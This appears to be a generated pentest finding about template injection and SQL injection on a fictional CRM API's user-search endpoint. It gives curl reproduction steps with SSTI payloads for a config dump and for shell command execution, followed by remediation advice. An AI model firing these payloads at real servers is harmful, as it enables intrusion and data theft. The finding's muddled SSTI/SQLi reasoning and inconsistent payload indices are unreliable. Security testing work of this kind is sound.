## System

- System: PipelinePro Sales API v3.5.0
- Domain: B2B SaaS / CRM
- Example ID: INJ-0134
- Risk ID: RISK-INJ-134
- Vulnerability: SSTI (Server-Side Template Injection)

## Findings

### 1. SSTI on `/api/v3/users?search=` (HAR Primary)

**HAR evidence**: `GET /api/v3/users?search={{7*7}}` → HTTP 200 with all user records: `username: "admin"`, `password_hash: "$2b$12$secret"`, `role: "ADMIN"`, `username: "user2"`.

**SSTI (Server-Side Template Injection)**: Section 2.0 — "Jinja2/Nunjucks template engine — primary data store." The `search` parameter is passed directly into a Jinja2/Nunjucks template expression. If the template engine evaluates `{{7*7}}` and returns `49` in the response, SSTI is confirmed. Full SSTI enables: server environment variable dump (`{{config}}`), file read (`{{''.__class__.__mro__[2].__subclasses__()}}`), and Remote Code Execution (RCE) via Python/JS subclass traversal.

**Context inconsistency**: Section 3.0 shows raw SQL string concatenation (`SELECT * FROM users WHERE search = '${req.query.search}'`) and the HAR response contains SQL-structured data. The primary exploitation path depends on which is active: template injection (SSTI) or SQL injection (SQLi). Both vectors are demonstrated since the endpoint mixes both risks and `db_owner` privileges amplify SQLi severity.

**B2B SaaS / CRM impact**: `users` contains CRM sales rep accounts, customer contacts, and admin credentials. Admin credential theft enables full CRM takeover. SSTI RCE allows server compromise and mass customer data exfiltration from the CRM pipeline.

**Root cause**: Jinja2/Nunjucks template renders user input unsandboxed; SQL raw string concatenation — no parameterization, no WAF, no input validation on legacy endpoint (RISK-INJ-134).

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search=normalvalue" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected: Returns matching records only.

**Step 2 — SSTI probe: arithmetic expression (primary HAR attack):**

```bash
curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search={{7*7}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected secure: 400 Bad Request / raw string `{{7*7}}` returned / sanitized error.  
Expected vulnerable (SSTI): Response contains `49` — template executed. Or HTTP 200 with all user records (SQLi path via template bypass).

**Step 3 — SSTI escalation: config/environment dump (Jinja2):**

```bash
curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search={{config}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: Server configuration including secret keys, DB connection strings, API keys returned.

**Step 4 — SSTI RCE attempt (Jinja2/Python subclass traversal):**

```bash
curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search={{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()}}" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected vulnerable: OS command output (`uid=...`) confirming Remote Code Execution.

**Step 5 — Verbose error confirmation:**

```bash
curl -s "https://api.pipelinepro-sal.example.com/api/v3/users?search='" \
  -H "Authorization: Bearer <VALID_TOKEN>"
```

Expected (if misconfigured): SQL/template syntax error leaking table name, engine version.

## Evidence

- **HAR**: `GET /api/v3/users?search={{7*7}}` → HTTP 200 → all user records with `password_hash` and `role: "ADMIN"`.
- **Section 2.0**: Jinja2/Nunjucks template engine — template injection vector.
- **Section 3.0 (RISK-INJ-134)**: raw SQL string concatenation — SQLi vector.
- **Section 6.0**: `db_owner` privileges, no WAF, verbose errors.

## Remediation

- **Sandbox template engine**: Jinja2 sandbox (`jinja2.sandbox.SandboxedEnvironment`) — disable `__class__`, `__mro__`, `__subclasses__` access.
- **Never render user input in templates**: pass user input as template context variables, not as template source.
- **Parameterized queries**: replace SQL string concatenation with `?` or named parameters (RISK-INJ-134 remediation).
- **Restrict DB account**: least-privilege — SELECT only on required tables.
- **Disable verbose error messages in production**.
- **Input validation middleware**: reject `{{`, `}}`, `{%`, `%}`, `'`, `;`, `--` in query parameters.
